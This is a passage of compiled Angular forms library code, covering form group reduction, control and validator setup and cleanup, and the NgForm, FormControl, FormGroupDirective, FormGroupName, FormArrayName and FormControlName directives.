      control.setParent(this);
      control._registerOnCollectionChange(this._onCollectionChange);
    });
  }
  /** @internal */
  _updateValue() {
    this.value = this._reduceValue();
  }
  /** @internal */
  _anyControls(condition) {
    for (const [controlName, control] of Object.entries(this.controls)) {
      if (this.contains(controlName) && condition(control)) {
        return true;
      }
    }
    return false;
  }
  /** @internal */
  _reduceValue() {
    let acc = {};
    return this._reduceChildren(acc, (acc2, control, name) => {
      if (control.enabled || this.disabled) {
        acc2[name] = control.value;
      }
      return acc2;
    });
  }
  /** @internal */
  _reduceChildren(initValue, fn) {
    let res = initValue;
    this._forEachChild((control, name) => {
      res = fn(res, control, name);
    });
    return res;
  }
  /** @internal */
  _allControlsDisabled() {
    for (const controlName of Object.keys(this.controls)) {
      if (this.controls[controlName].enabled) {
        return false;
      }
    }
    return Object.keys(this.controls).length > 0 || this.disabled;
  }
  /** @internal */
  _find(name) {
    return this.controls.hasOwnProperty(name) ? this.controls[name] : null;
  }
};
function validateFormGroupControls(controls) {
  const invalidKeys = Object.keys(controls).filter((key) => key.includes("."));
  if (invalidKeys.length > 0) {
    console.warn(`FormGroup keys cannot include \`.\`, please replace the keys for: ${invalidKeys.join(",")}.`);
  }
}
var FormRecord = class extends FormGroup {
};
var CALL_SET_DISABLED_STATE = /* @__PURE__ */ new InjectionToken("CallSetDisabledState", {
  providedIn: "root",
  factory: () => setDisabledStateDefault
});
var setDisabledStateDefault = "always";
function controlPath(name, parent) {
  return [...parent.path, name];
}
function setUpControl(control, dir, callSetDisabledState = setDisabledStateDefault) {
  if (typeof ngDevMode === "undefined" || ngDevMode) {
    if (!control)
      _throwError(dir, "Cannot find control with");
    if (!dir.valueAccessor)
      _throwMissingValueAccessorError(dir);
  }
  setUpValidators(control, dir);
  dir.valueAccessor.writeValue(control.value);
  if (control.disabled || callSetDisabledState === "always") {
    dir.valueAccessor.setDisabledState?.(control.disabled);
  }
  setUpViewChangePipeline(control, dir);
  setUpModelChangePipeline(control, dir);
  setUpBlurPipeline(control, dir);
  setUpDisabledChangeHandler(control, dir);
}
function cleanUpControl(control, dir, validateControlPresenceOnChange = true) {
  const noop = () => {
    if (validateControlPresenceOnChange && (typeof ngDevMode === "undefined" || ngDevMode)) {
      _noControlError(dir);
    }
  };
  if (dir.valueAccessor) {
    dir.valueAccessor.registerOnChange(noop);
    dir.valueAccessor.registerOnTouched(noop);
  }
  cleanUpValidators(control, dir);
  if (control) {
    dir._invokeOnDestroyCallbacks();
    control._registerOnCollectionChange(() => {
    });
  }
}
function registerOnValidatorChange(validators, onChange) {
  validators.forEach((validator) => {
    if (validator.registerOnValidatorChange)
      validator.registerOnValidatorChange(onChange);
  });
}
function setUpDisabledChangeHandler(control, dir) {
  if (dir.valueAccessor.setDisabledState) {
    const onDisabledChange = (isDisabled) => {
      dir.valueAccessor.setDisabledState(isDisabled);
    };
    control.registerOnDisabledChange(onDisabledChange);
    dir._registerOnDestroy(() => {
      control._unregisterOnDisabledChange(onDisabledChange);
    });
  }
}
function setUpValidators(control, dir) {
  const validators = getControlValidators(control);
  if (dir.validator !== null) {
    control.setValidators(mergeValidators(validators, dir.validator));
  } else if (typeof validators === "function") {
    control.setValidators([validators]);
  }
  const asyncValidators = getControlAsyncValidators(control);
  if (dir.asyncValidator !== null) {
    control.setAsyncValidators(mergeValidators(asyncValidators, dir.asyncValidator));
  } else if (typeof asyncValidators === "function") {
    control.setAsyncValidators([asyncValidators]);
  }
  const onValidatorChange = () => control.updateValueAndValidity();
  registerOnValidatorChange(dir._rawValidators, onValidatorChange);
  registerOnValidatorChange(dir._rawAsyncValidators, onValidatorChange);
}
function cleanUpValidators(control, dir) {
  let isControlUpdated = false;
  if (control !== null) {
    if (dir.validator !== null) {
      const validators = getControlValidators(control);
      if (Array.isArray(validators) && validators.length > 0) {
        const updatedValidators = validators.filter((validator) => validator !== dir.validator);
        if (updatedValidators.length !== validators.length) {
          isControlUpdated = true;
          control.setValidators(updatedValidators);
        }
      }
    }
    if (dir.asyncValidator !== null) {
      const asyncValidators = getControlAsyncValidators(control);
      if (Array.isArray(asyncValidators) && asyncValidators.length > 0) {
        const updatedAsyncValidators = asyncValidators.filter((asyncValidator) => asyncValidator !== dir.asyncValidator);
        if (updatedAsyncValidators.length !== asyncValidators.length) {
          isControlUpdated = true;
          control.setAsyncValidators(updatedAsyncValidators);
        }
      }
    }
  }
  const noop = () => {
  };
  registerOnValidatorChange(dir._rawValidators, noop);
  registerOnValidatorChange(dir._rawAsyncValidators, noop);
  return isControlUpdated;
}
function setUpViewChangePipeline(control, dir) {
  dir.valueAccessor.registerOnChange((newValue) => {
    control._pendingValue = newValue;
    control._pendingChange = true;
    control._pendingDirty = true;
    if (control.updateOn === "change")
      updateControl(control, dir);
  });
}
function setUpBlurPipeline(control, dir) {
  dir.valueAccessor.registerOnTouched(() => {
    control._pendingTouched = true;
    if (control.updateOn === "blur" && control._pendingChange)
      updateControl(control, dir);
    if (control.updateOn !== "submit")
      control.markAsTouched();
  });
}
function updateControl(control, dir) {
  if (control._pendingDirty)
    control.markAsDirty();
  control.setValue(control._pendingValue, {
    emitModelToViewChange: false
  });
  dir.viewToModelUpdate(control._pendingValue);
  control._pendingChange = false;
}
function setUpModelChangePipeline(control, dir) {
  const onChange = (newValue, emitModelEvent) => {
    dir.valueAccessor.writeValue(newValue);
    if (emitModelEvent)
      dir.viewToModelUpdate(newValue);
  };
  control.registerOnChange(onChange);
  dir._registerOnDestroy(() => {
    control._unregisterOnChange(onChange);
  });
}
function setUpFormContainer(control, dir) {
  if (control == null && (typeof ngDevMode === "undefined" || ngDevMode))
    _throwError(dir, "Cannot find control with");
  setUpValidators(control, dir);
}
function cleanUpFormContainer(control, dir) {
  return cleanUpValidators(control, dir);
}
function _noControlError(dir) {
  return _throwError(dir, "There is no FormControl instance attached to form control element with");
}
function _throwError(dir, message) {
  const messageEnd = _describeControlLocation(dir);
  throw new Error(`${message} ${messageEnd}`);
}
function _describeControlLocation(dir) {
  const path = dir.path;
  if (path && path.length > 1)
    return `path: '${path.join(" -> ")}'`;
  if (path?.[0])
    return `name: '${path}'`;
  return "unspecified name attribute";
}
function _throwMissingValueAccessorError(dir) {
  const loc = _describeControlLocation(dir);
  throw new RuntimeError(-1203, `No value accessor for form control ${loc}.`);
}
function _throwInvalidValueAccessorError(dir) {
  const loc = _describeControlLocation(dir);
  throw new RuntimeError(1200, `Value accessor was not provided as an array for form control with ${loc}. Check that the \`NG_VALUE_ACCESSOR\` token is configured as a \`multi: true\` provider.`);
}
function isPropertyUpdated(changes, viewModel) {
  if (!changes.hasOwnProperty("model"))
    return false;
  const change = changes["model"];
  if (change.isFirstChange())
    return true;
  return !Object.is(viewModel, change.currentValue);
}
function isBuiltInAccessor(valueAccessor) {
  return Object.getPrototypeOf(valueAccessor.constructor) === BuiltInControlValueAccessor;
}
function syncPendingControls(form, directives) {
  form._syncPendingControls();
  directives.forEach((dir) => {
    const control = dir.control;
    if (control.updateOn === "submit" && control._pendingChange) {
      dir.viewToModelUpdate(control._pendingValue);
      control._pendingChange = false;
    }
  });
}
function selectValueAccessor(dir, valueAccessors) {
  if (!valueAccessors)
    return null;
  if (!Array.isArray(valueAccessors) && (typeof ngDevMode === "undefined" || ngDevMode))
    _throwInvalidValueAccessorError(dir);
  let defaultAccessor = void 0;
  let builtinAccessor = void 0;
  let customAccessor = void 0;
  valueAccessors.forEach((v) => {
    if (v.constructor === DefaultValueAccessor) {
      defaultAccessor = v;
    } else if (isBuiltInAccessor(v)) {
      if (builtinAccessor && (typeof ngDevMode === "undefined" || ngDevMode))
        _throwError(dir, "More than one built-in value accessor matches form control with");
      builtinAccessor = v;
    } else {
      if (customAccessor && (typeof ngDevMode === "undefined" || ngDevMode))
        _throwError(dir, "More than one custom value accessor matches form control with");
      customAccessor = v;
    }
  });
  if (customAccessor)
    return customAccessor;
  if (builtinAccessor)
    return builtinAccessor;
  if (defaultAccessor)
    return defaultAccessor;
  if (typeof ngDevMode === "undefined" || ngDevMode) {
    _throwError(dir, "No valid value accessor for form control with");
  }
  return null;
}
function removeListItem$1(list, el) {
  const index = list.indexOf(el);
  if (index > -1)
    list.splice(index, 1);
}
function _ngModelWarning(name, type, instance, warningConfig) {
  if (warningConfig === "never")
    return;
  if ((warningConfig === null || warningConfig === "once") && !type._ngModelWarningSentOnce || warningConfig === "always" && !instance._ngModelWarningSent) {
    console.warn(ngModelWarning(name));
    type._ngModelWarningSentOnce = true;
    instance._ngModelWarningSent = true;
  }
}
var formDirectiveProvider$1 = {
  provide: ControlContainer,
  useExisting: /* @__PURE__ */ forwardRef(() => NgForm)
};
var resolvedPromise$1 = /* @__PURE__ */ (() => Promise.resolve())();
var NgForm = /* @__PURE__ */ (() => {
  const _NgForm = class _NgForm extends ControlContainer {
    constructor(validators, asyncValidators, callSetDisabledState) {
      super();
      this.callSetDisabledState = callSetDisabledState;
      this.submitted = false;
      this._directives = /* @__PURE__ */ new Set();
      this.ngSubmit = new EventEmitter();
      this.form = new FormGroup({}, composeValidators(validators), composeAsyncValidators(asyncValidators));
    }
    /** @nodoc */
    ngAfterViewInit() {
      this._setUpdateStrategy();
    }
    /**
     * @description
     * The directive instance.
     */
    get formDirective() {
      return this;
    }
    /**
     * @description
     * The internal `FormGroup` instance.
     */
    get control() {
      return this.form;
    }
    /**
     * @description
     * Returns an array representing the path to this group. Because this directive
     * always lives at the top level of a form, it is always an empty array.
     */
    get path() {
      return [];
    }
    /**
     * @description
     * Returns a map of the controls in this group.
     */
    get controls() {
      return this.form.controls;
    }
    /**
     * @description
     * Method that sets up the control directive in this group, re-calculates its value
     * and validity, and adds the instance to the internal list of directives.
     *
     * @param dir The `NgModel` directive instance.
     */
    addControl(dir) {
      resolvedPromise$1.then(() => {
        const container = this._findContainer(dir.path);
        dir.control = container.registerControl(dir.name, dir.control);
        setUpControl(dir.control, dir, this.callSetDisabledState);
        dir.control.updateValueAndValidity({
          emitEvent: false
        });
        this._directives.add(dir);
      });
    }
    /**
     * @description
     * Retrieves the `FormControl` instance from the provided `NgModel` directive.
     *
     * @param dir The `NgModel` directive instance.
     */
    getControl(dir) {
      return this.form.get(dir.path);
    }
    /**
     * @description
     * Removes the `NgModel` instance from the internal list of directives
     *
     * @param dir The `NgModel` directive instance.
     */
    removeControl(dir) {
      resolvedPromise$1.then(() => {
        const container = this._findContainer(dir.path);
        if (container) {
          container.removeControl(dir.name);
        }
        this._directives.delete(dir);
      });
    }
    /**
     * @description
     * Adds a new `NgModelGroup` directive instance to the form.
     *
     * @param dir The `NgModelGroup` directive instance.
     */
    addFormGroup(dir) {
      resolvedPromise$1.then(() => {
        const container = this._findContainer(dir.path);
        const group = new FormGroup({});
        setUpFormContainer(group, dir);
        container.registerControl(dir.name, group);
        group.updateValueAndValidity({
          emitEvent: false
        });
      });
    }
    /**
     * @description
     * Removes the `NgModelGroup` directive instance from the form.
     *
     * @param dir The `NgModelGroup` directive instance.
     */
    removeFormGroup(dir) {
      resolvedPromise$1.then(() => {
        const container = this._findContainer(dir.path);
        if (container) {
          container.removeControl(dir.name);
        }
      });
    }
    /**
     * @description
     * Retrieves the `FormGroup` for a provided `NgModelGroup` directive instance
     *
     * @param dir The `NgModelGroup` directive instance.
     */
    getFormGroup(dir) {
      return this.form.get(dir.path);
    }
    /**
     * Sets the new value for the provided `NgControl` directive.
     *
     * @param dir The `NgControl` directive instance.
     * @param value The new value for the directive's control.
     */
    updateModel(dir, value) {
      resolvedPromise$1.then(() => {
        const ctrl = this.form.get(dir.path);
        ctrl.setValue(value);
      });
    }
    /**
     * @description
     * Sets the value for this `FormGroup`.
     *
     * @param value The new value
     */
    setValue(value) {
      this.control.setValue(value);
    }
    /**
     * @description
     * Method called when the "submit" event is triggered on the form.
     * Triggers the `ngSubmit` emitter to emit the "submit" event as its payload.
     *
     * @param $event The "submit" event object
     */
    onSubmit($event) {
      this.submitted = true;
      syncPendingControls(this.form, this._directives);
      this.ngSubmit.emit($event);
      return $event?.target?.method === "dialog";
    }
    /**
     * @description
     * Method called when the "reset" event is triggered on the form.
     */
    onReset() {
      this.resetForm();
    }
    /**
     * @description
     * Resets the form to an initial value and resets its submitted status.
     *
     * @param value The new value for the form.
     */
    resetForm(value = void 0) {
      this.form.reset(value);
      this.submitted = false;
    }
    _setUpdateStrategy() {
      if (this.options && this.options.updateOn != null) {
        this.form._updateOn = this.options.updateOn;
      }
    }
    _findContainer(path) {
      path.pop();
      return path.length ? this.form.get(path) : this.form;
    }
  };
  _NgForm.\u0275fac = function NgForm_Factory(t) {
    return new (t || _NgForm)(\u0275\u0275directiveInject(NG_VALIDATORS, 10), \u0275\u0275directiveInject(NG_ASYNC_VALIDATORS, 10), \u0275\u0275directiveInject(CALL_SET_DISABLED_STATE, 8));
  };
  _NgForm.\u0275dir = /* @__PURE__ */ \u0275\u0275defineDirective({
    type: _NgForm,
    selectors: [["form", 3, "ngNoForm", "", 3, "formGroup", ""], ["ng-form"], ["", "ngForm", ""]],
    hostBindings: function NgForm_HostBindings(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275listener("submit", function NgForm_submit_HostBindingHandler($event) {
          return ctx.onSubmit($event);
        })("reset", function NgForm_reset_HostBindingHandler() {
          return ctx.onReset();
        });
      }
    },
    inputs: {
      options: ["ngFormOptions", "options"]
    },
    outputs: {
      ngSubmit: "ngSubmit"
    },
    exportAs: ["ngForm"],
    features: [\u0275\u0275ProvidersFeature([formDirectiveProvider$1]), \u0275\u0275InheritDefinitionFeature]
  });
  let NgForm2 = _NgForm;
  return NgForm2;
})();
function removeListItem(list, el) {
  const index = list.indexOf(el);
  if (index > -1)
    list.splice(index, 1);
}
function isFormControlState(formState) {
  return typeof formState === "object" && formState !== null && Object.keys(formState).length === 2 && "value" in formState && "disabled" in formState;
}
var FormControl = class FormControl2 extends AbstractControl {
  constructor(formState = null, validatorOrOpts, asyncValidator) {
    super(pickValidators(validatorOrOpts), pickAsyncValidators(asyncValidator, validatorOrOpts));
    this.defaultValue = null;
    this._onChange = [];
    this._pendingChange = false;
    this._applyFormState(formState);
    this._setUpdateStrategy(validatorOrOpts);
    this._initObservables();
    this.updateValueAndValidity({
      onlySelf: true,
      // If `asyncValidator` is present, it will trigger control status change from `PENDING` to
      // `VALID` or `INVALID`.
      // The status should be broadcasted via the `statusChanges` observable, so we set
      // `emitEvent` to `true` to allow that during the control creation process.
      emitEvent: !!this.asyncValidator
    });
    if (isOptionsObj(validatorOrOpts) && (validatorOrOpts.nonNullable || validatorOrOpts.initialValueIsDefault)) {
      if (isFormControlState(formState)) {
        this.defaultValue = formState.value;
      } else {
        this.defaultValue = formState;
      }
    }
  }
  setValue(value, options = {}) {
    this.value = this._pendingValue = value;
    if (this._onChange.length && options.emitModelToViewChange !== false) {
      this._onChange.forEach((changeFn) => changeFn(this.value, options.emitViewToModelChange !== false));
    }
    this.updateValueAndValidity(options);
  }
  patchValue(value, options = {}) {
    this.setValue(value, options);
  }
  reset(formState = this.defaultValue, options = {}) {
    this._applyFormState(formState);
    this.markAsPristine(options);
    this.markAsUntouched(options);
    this.setValue(this.value, options);
    this._pendingChange = false;
  }
  /**  @internal */
  _updateValue() {
  }
  /**  @internal */
  _anyControls(condition) {
    return false;
  }
  /**  @internal */
  _allControlsDisabled() {
    return this.disabled;
  }
  registerOnChange(fn) {
    this._onChange.push(fn);
  }
  /** @internal */
  _unregisterOnChange(fn) {
    removeListItem(this._onChange, fn);
  }
  registerOnDisabledChange(fn) {
    this._onDisabledChange.push(fn);
  }
  /** @internal */
  _unregisterOnDisabledChange(fn) {
    removeListItem(this._onDisabledChange, fn);
  }
  /** @internal */
  _forEachChild(cb) {
  }
  /** @internal */
  _syncPendingControls() {
    if (this.updateOn === "submit") {
      if (this._pendingDirty)
        this.markAsDirty();
      if (this._pendingTouched)
        this.markAsTouched();
      if (this._pendingChange) {
        this.setValue(this._pendingValue, {
          onlySelf: true,
          emitModelToViewChange: false
        });
        return true;
      }
    }
    return false;
  }
  _applyFormState(formState) {
    if (isFormControlState(formState)) {
      this.value = this._pendingValue = formState.value;
      formState.disabled ? this.disable({
        onlySelf: true,
        emitEvent: false
      }) : this.enable({
        onlySelf: true,
        emitEvent: false
      });
    } else {
      this.value = this._pendingValue = formState;
    }
  }
};
var isFormControl = (control) => control instanceof FormControl;
var AbstractFormGroupDirective = /* @__PURE__ */ (() => {
  const _AbstractFormGroupDirective = class _AbstractFormGroupDirective extends ControlContainer {
    /** @nodoc */
    ngOnInit() {
      this._checkParentType();
      this.formDirective.addFormGroup(this);
    }
    /** @nodoc */
    ngOnDestroy() {
      if (this.formDirective) {
        this.formDirective.removeFormGroup(this);
      }
    }
    /**
     * @description
     * The `FormGroup` bound to this directive.
     */
    get control() {
      return this.formDirective.getFormGroup(this);
    }
    /**
     * @description
     * The path to this group from the top-level directive.
     */
    get path() {
      return controlPath(this.name == null ? this.name : this.name.toString(), this._parent);
    }
    /**
     * @description
     * The top-level directive for this group if present, otherwise null.
     */
    get formDirective() {
      return this._parent ? this._parent.formDirective : null;
    }
    /** @internal */
    _checkParentType() {
    }
  };
  _AbstractFormGroupDirective.\u0275fac = /* @__PURE__ */ (() => {
    let \u0275AbstractFormGroupDirective_BaseFactory;
    return function AbstractFormGroupDirective_Factory(t) {
      return (\u0275AbstractFormGroupDirective_BaseFactory || (\u0275AbstractFormGroupDirective_BaseFactory = \u0275\u0275getInheritedFactory(_AbstractFormGroupDirective)))(t || _AbstractFormGroupDirective);
    };
  })();
  _AbstractFormGroupDirective.\u0275dir = /* @__PURE__ */ \u0275\u0275defineDirective({
    type: _AbstractFormGroupDirective,
    features: [\u0275\u0275InheritDefinitionFeature]
  });
  let AbstractFormGroupDirective2 = _AbstractFormGroupDirective;
  return AbstractFormGroupDirective2;
})();
var \u0275NgNoValidate = /* @__PURE__ */ (() => {
  const _\u0275NgNoValidate = class _\u0275NgNoValidate {
  };
  _\u0275NgNoValidate.\u0275fac = function \u0275NgNoValidate_Factory(t) {
    return new (t || _\u0275NgNoValidate)();
  };
  _\u0275NgNoValidate.\u0275dir = /* @__PURE__ */ \u0275\u0275defineDirective({
    type: _\u0275NgNoValidate,
    selectors: [["form", 3, "ngNoForm", "", 3, "ngNativeValidate", ""]],
    hostAttrs: ["novalidate", ""]
  });
  let \u0275NgNoValidate2 = _\u0275NgNoValidate;
  return \u0275NgNoValidate2;
})();
var RadioControlRegistryModule = /* @__PURE__ */ (() => {
  const _RadioControlRegistryModule = class _RadioControlRegistryModule {
  };
  _RadioControlRegistryModule.\u0275fac = function RadioControlRegistryModule_Factory(t) {
    return new (t || _RadioControlRegistryModule)();
  };
  _RadioControlRegistryModule.\u0275mod = /* @__PURE__ */ \u0275\u0275defineNgModule({
    type: _RadioControlRegistryModule
  });
  _RadioControlRegistryModule.\u0275inj = /* @__PURE__ */ \u0275\u0275defineInjector({});
  let RadioControlRegistryModule2 = _RadioControlRegistryModule;
  return RadioControlRegistryModule2;
})();
var NG_MODEL_WITH_FORM_CONTROL_WARNING = /* @__PURE__ */ new InjectionToken("NgModelWithFormControlWarning");
var formDirectiveProvider = {
  provide: ControlContainer,
  useExisting: /* @__PURE__ */ forwardRef(() => FormGroupDirective)
};
var FormGroupDirective = /* @__PURE__ */ (() => {
  const _FormGroupDirective = class _FormGroupDirective extends ControlContainer {
    constructor(validators, asyncValidators, callSetDisabledState) {
      super();
      this.callSetDisabledState = callSetDisabledState;
      this.submitted = false;
      this._onCollectionChange = () => this._updateDomValue();
      this.directives = [];
      this.form = null;
      this.ngSubmit = new EventEmitter();
      this._setValidators(validators);
      this._setAsyncValidators(asyncValidators);
    }
    /** @nodoc */
    ngOnChanges(changes) {
      this._checkFormPresent();
      if (changes.hasOwnProperty("form")) {
        this._updateValidators();
        this._updateDomValue();
        this._updateRegistrations();
        this._oldForm = this.form;
      }
    }
    /** @nodoc */
    ngOnDestroy() {
      if (this.form) {
        cleanUpValidators(this.form, this);
        if (this.form._onCollectionChange === this._onCollectionChange) {
          this.form._registerOnCollectionChange(() => {
          });
        }
      }
    }
    /**
     * @description
     * Returns this directive's instance.
     */
    get formDirective() {
      return this;
    }
    /**
     * @description
     * Returns the `FormGroup` bound to this directive.
     */
    get control() {
      return this.form;
    }
    /**
     * @description
     * Returns an array representing the path to this group. Because this directive
     * always lives at the top level of a form, it always an empty array.
     */
    get path() {
      return [];
    }
    /**
     * @description
     * Method that sets up the control directive in this group, re-calculates its value
     * and validity, and adds the instance to the internal list of directives.
     *
     * @param dir The `FormControlName` directive instance.
     */
    addControl(dir) {
      const ctrl = this.form.get(dir.path);
      setUpControl(ctrl, dir, this.callSetDisabledState);
      ctrl.updateValueAndValidity({
        emitEvent: false
      });
      this.directives.push(dir);
      return ctrl;
    }
    /**
     * @description
     * Retrieves the `FormControl` instance from the provided `FormControlName` directive
     *
     * @param dir The `FormControlName` directive instance.
     */
    getControl(dir) {
      return this.form.get(dir.path);
    }
    /**
     * @description
     * Removes the `FormControlName` instance from the internal list of directives
     *
     * @param dir The `FormControlName` directive instance.
     */
    removeControl(dir) {
      cleanUpControl(
        dir.control || null,
        dir,
        /* validateControlPresenceOnChange */
        false
      );
      removeListItem$1(this.directives, dir);
    }
    /**
     * Adds a new `FormGroupName` directive instance to the form.
     *
     * @param dir The `FormGroupName` directive instance.
     */
    addFormGroup(dir) {
      this._setUpFormContainer(dir);
    }
    /**
     * Performs the necessary cleanup when a `FormGroupName` directive instance is removed from the
     * view.
     *
     * @param dir The `FormGroupName` directive instance.
     */
    removeFormGroup(dir) {
      this._cleanUpFormContainer(dir);
    }
    /**
     * @description
     * Retrieves the `FormGroup` for a provided `FormGroupName` directive instance
     *
     * @param dir The `FormGroupName` directive instance.
     */
    getFormGroup(dir) {
      return this.form.get(dir.path);
    }
    /**
     * Performs the necessary setup when a `FormArrayName` directive instance is added to the view.
     *
     * @param dir The `FormArrayName` directive instance.
     */
    addFormArray(dir) {
      this._setUpFormContainer(dir);
    }
    /**
     * Performs the necessary cleanup when a `FormArrayName` directive instance is removed from the
     * view.
     *
     * @param dir The `FormArrayName` directive instance.
     */
    removeFormArray(dir) {
      this._cleanUpFormContainer(dir);
    }
    /**
     * @description
     * Retrieves the `FormArray` for a provided `FormArrayName` directive instance.
     *
     * @param dir The `FormArrayName` directive instance.
     */
    getFormArray(dir) {
      return this.form.get(dir.path);
    }
    /**
     * Sets the new value for the provided `FormControlName` directive.
     *
     * @param dir The `FormControlName` directive instance.
     * @param value The new value for the directive's control.
     */
    updateModel(dir, value) {
      const ctrl = this.form.get(dir.path);
      ctrl.setValue(value);
    }
    /**
     * @description
     * Method called with the "submit" event is triggered on the form.
     * Triggers the `ngSubmit` emitter to emit the "submit" event as its payload.
     *
     * @param $event The "submit" event object
     */
    onSubmit($event) {
      this.submitted = true;
      syncPendingControls(this.form, this.directives);
      this.ngSubmit.emit($event);
      return $event?.target?.method === "dialog";
    }
    /**
     * @description
     * Method called when the "reset" event is triggered on the form.
     */
    onReset() {
      this.resetForm();
    }
    /**
     * @description
     * Resets the form to an initial value and resets its submitted status.
     *
     * @param value The new value for the form.
     */
    resetForm(value = void 0) {
      this.form.reset(value);
      this.submitted = false;
    }
    /** @internal */
    _updateDomValue() {
      this.directives.forEach((dir) => {
        const oldCtrl = dir.control;
        const newCtrl = this.form.get(dir.path);
        if (oldCtrl !== newCtrl) {
          cleanUpControl(oldCtrl || null, dir);
          if (isFormControl(newCtrl)) {
            setUpControl(newCtrl, dir, this.callSetDisabledState);
            dir.control = newCtrl;
          }
        }
      });
      this.form._updateTreeValidity({
        emitEvent: false
      });
    }
    _setUpFormContainer(dir) {
      const ctrl = this.form.get(dir.path);
      setUpFormContainer(ctrl, dir);
      ctrl.updateValueAndValidity({
        emitEvent: false
      });
    }
    _cleanUpFormContainer(dir) {
      if (this.form) {
        const ctrl = this.form.get(dir.path);
        if (ctrl) {
          const isControlUpdated = cleanUpFormContainer(ctrl, dir);
          if (isControlUpdated) {
            ctrl.updateValueAndValidity({
              emitEvent: false
            });
          }
        }
      }
    }
    _updateRegistrations() {
      this.form._registerOnCollectionChange(this._onCollectionChange);
      if (this._oldForm) {
        this._oldForm._registerOnCollectionChange(() => {
        });
      }
    }
    _updateValidators() {
      setUpValidators(this.form, this);
      if (this._oldForm) {
        cleanUpValidators(this._oldForm, this);
      }
    }
    _checkFormPresent() {
      if (!this.form && (typeof ngDevMode === "undefined" || ngDevMode)) {
        throw missingFormException();
      }
    }
  };
  _FormGroupDirective.\u0275fac = function FormGroupDirective_Factory(t) {
    return new (t || _FormGroupDirective)(\u0275\u0275directiveInject(NG_VALIDATORS, 10), \u0275\u0275directiveInject(NG_ASYNC_VALIDATORS, 10), \u0275\u0275directiveInject(CALL_SET_DISABLED_STATE, 8));
  };
  _FormGroupDirective.\u0275dir = /* @__PURE__ */ \u0275\u0275defineDirective({
    type: _FormGroupDirective,
    selectors: [["", "formGroup", ""]],
    hostBindings: function FormGroupDirective_HostBindings(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275listener("submit", function FormGroupDirective_submit_HostBindingHandler($event) {
          return ctx.onSubmit($event);
        })("reset", function FormGroupDirective_reset_HostBindingHandler() {
          return ctx.onReset();
        });
      }
    },
    inputs: {
      form: ["formGroup", "form"]
    },
    outputs: {
      ngSubmit: "ngSubmit"
    },
    exportAs: ["ngForm"],
    features: [\u0275\u0275ProvidersFeature([formDirectiveProvider]), \u0275\u0275InheritDefinitionFeature, \u0275\u0275NgOnChangesFeature]
  });
  let FormGroupDirective2 = _FormGroupDirective;
  return FormGroupDirective2;
})();
var formGroupNameProvider = {
  provide: ControlContainer,
  useExisting: /* @__PURE__ */ forwardRef(() => FormGroupName)
};
var FormGroupName = /* @__PURE__ */ (() => {
  const _FormGroupName = class _FormGroupName extends AbstractFormGroupDirective {
    constructor(parent, validators, asyncValidators) {
      super();
      this.name = null;
      this._parent = parent;
      this._setValidators(validators);
      this._setAsyncValidators(asyncValidators);
    }
    /** @internal */
    _checkParentType() {
      if (_hasInvalidParent(this._parent) && (typeof ngDevMode === "undefined" || ngDevMode)) {
        throw groupParentException();
      }
    }
  };
  _FormGroupName.\u0275fac = function FormGroupName_Factory(t) {
    return new (t || _FormGroupName)(\u0275\u0275directiveInject(ControlContainer, 13), \u0275\u0275directiveInject(NG_VALIDATORS, 10), \u0275\u0275directiveInject(NG_ASYNC_VALIDATORS, 10));
  };
  _FormGroupName.\u0275dir = /* @__PURE__ */ \u0275\u0275defineDirective({
    type: _FormGroupName,
    selectors: [["", "formGroupName", ""]],
    inputs: {
      name: ["formGroupName", "name"]
    },
    features: [\u0275\u0275ProvidersFeature([formGroupNameProvider]), \u0275\u0275InheritDefinitionFeature]
  });
  let FormGroupName2 = _FormGroupName;
  return FormGroupName2;
})();
var formArrayNameProvider = {
  provide: ControlContainer,
  useExisting: /* @__PURE__ */ forwardRef(() => FormArrayName)
};
var FormArrayName = /* @__PURE__ */ (() => {
  const _FormArrayName = class _FormArrayName extends ControlContainer {
    constructor(parent, validators, asyncValidators) {
      super();
      this.name = null;
      this._parent = parent;
      this._setValidators(validators);
      this._setAsyncValidators(asyncValidators);
    }
    /**
     * A lifecycle method called when the directive's inputs are initialized. For internal use only.
     * @throws If the directive does not have a valid parent.
     * @nodoc
     */
    ngOnInit() {
      this._checkParentType();
      this.formDirective.addFormArray(this);
    }
    /**
     * A lifecycle method called before the directive's instance is destroyed. For internal use only.
     * @nodoc
     */
    ngOnDestroy() {
      if (this.formDirective) {
        this.formDirective.removeFormArray(this);
      }
    }
    /**
     * @description
     * The `FormArray` bound to this directive.
     */
    get control() {
      return this.formDirective.getFormArray(this);
    }
    /**
     * @description
     * The top-level directive for this group if present, otherwise null.
     */
    get formDirective() {
      return this._parent ? this._parent.formDirective : null;
    }
    /**
     * @description
     * Returns an array that represents the path from the top-level form to this control.
     * Each index is the string name of the control on that level.
     */
    get path() {
      return controlPath(this.name == null ? this.name : this.name.toString(), this._parent);
    }
    _checkParentType() {
      if (_hasInvalidParent(this._parent) && (typeof ngDevMode === "undefined" || ngDevMode)) {
        throw arrayParentException();
      }
    }
  };
  _FormArrayName.\u0275fac = function FormArrayName_Factory(t) {
    return new (t || _FormArrayName)(\u0275\u0275directiveInject(ControlContainer, 13), \u0275\u0275directiveInject(NG_VALIDATORS, 10), \u0275\u0275directiveInject(NG_ASYNC_VALIDATORS, 10));
  };
  _FormArrayName.\u0275dir = /* @__PURE__ */ \u0275\u0275defineDirective({
    type: _FormArrayName,
    selectors: [["", "formArrayName", ""]],
    inputs: {
      name: ["formArrayName", "name"]
    },
    features: [\u0275\u0275ProvidersFeature([formArrayNameProvider]), \u0275\u0275InheritDefinitionFeature]
  });
  let FormArrayName2 = _FormArrayName;
  return FormArrayName2;
})();
function _hasInvalidParent(parent) {
  return !(parent instanceof FormGroupName) && !(parent instanceof FormGroupDirective) && !(parent instanceof FormArrayName);
}
var controlNameBinding = {
  provide: NgControl,
  useExisting: /* @__PURE__ */ forwardRef(() => FormControlName)
};
var FormControlName = /* @__PURE__ */ (() => {
  const _FormControlName = class _FormControlName extends NgControl {
    /**
     * @description
     * Triggers a warning in dev mode that this input should not be used with reactive forms.
     */
    set isDisabled(isDisabled) {
      if (typeof ngDevMode === "undefined" || ngDevMode) {
        console.warn(disabledAttrWarning);
      }
    }
    constructor(parent, validators, asyncValidators, valueAccessors, _ngModelWarningConfig) {
      super();
      this._ngModelWarningConfig = _ngModelWarningConfig;
      this._added = false;
      this.name = null;
      this.update = new EventEmitter();
      this._ngModelWarningSent = false;
      this._parent = parent;
      this._setValidators(validators);
      this._setAsyncValidators(asyncValidators);
      this.valueAccessor = selectValueAccessor(this, valueAccessors);
    }
